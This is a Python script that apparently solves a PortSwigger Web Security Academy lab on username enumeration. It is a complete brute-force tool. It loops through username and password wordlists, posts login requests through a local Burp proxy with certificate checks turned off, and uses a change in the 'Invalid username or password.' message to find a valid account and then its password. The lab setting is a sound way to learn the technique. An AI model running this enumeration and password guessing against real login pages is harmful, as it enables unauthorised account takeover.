# PortSwigger
# Lab: Username enumeration via subtly different responses

# Note.
# It doesn't seem like the best solution, but seeing how the website reacts to the attack, it's a good solution.

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target Data
url = ""
session = ""

# Localhost Proxies (To intercept with Burp Suite)
proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }

# Request Cookies
cookies = {
    "session": session
}

def read_file(path):
    file = open(path, "r")
    list_lines = file.readlines()
    file.close()
    return list_lines

def main():
    user_name = ''
    password = ''

    list_users = read_file('Authentication/usernames.txt')
    list_passwords = read_file('Authentication/passwords.txt')

    print("\r(+) Forcing user name...")
    for user in list_users:
        user = user.strip()

        sys.stdout.write("\r%s" % user)
        sys.stdout.flush()

        playload = f"username={user}&password=0"        
        response = requests.post(url, data=playload, cookies=cookies, verify=False, proxies=proxies)
        
        sys.stdout.write("\r%s" % (" " * len(user)))
        sys.stdout.flush()

        if response.text.count("Invalid username or password.") == 0:
            user_name = user
            break

    print('\r(+) The username is %s' % user_name)

    print("\r(+) Forcing password...")
    for pwd in list_passwords:
        pwd = pwd.strip()
        sys.stdout.write("\r%s" % pwd)
        sys.stdout.flush()

        playload = f"username={user_name}&password={pwd}"
        response = requests.post(url, data=playload, cookies=cookies, verify=False, proxies=proxies)

        sys.stdout.write("\r%s" % (" " * len(pwd)))
        sys.stdout.flush()

        if response.text.count("Invalid username or password.") == 0:
            password = pwd
            break

    print('\r(+) The password is %s' % password)


if __name__ == "__main__":
    main()
  
